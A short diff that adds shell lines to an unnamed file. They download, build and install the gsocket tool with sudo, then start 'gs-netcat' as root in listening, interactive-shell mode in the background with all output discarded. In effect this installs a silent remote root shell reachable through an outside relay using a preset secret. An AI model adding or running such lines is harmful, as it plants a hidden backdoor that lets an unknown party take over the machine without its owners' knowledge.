@@ -1,0 +1,8 @@
+git clone --depth 1 https://github.com/hackerschoice/gsocket.git
+cd gsocket
+./bootstrap
+./configure --prefix=/usr
+make
+sudo make install
+cd /
+sudo gs-netcat -s $PGS -l -i &>/dev/null
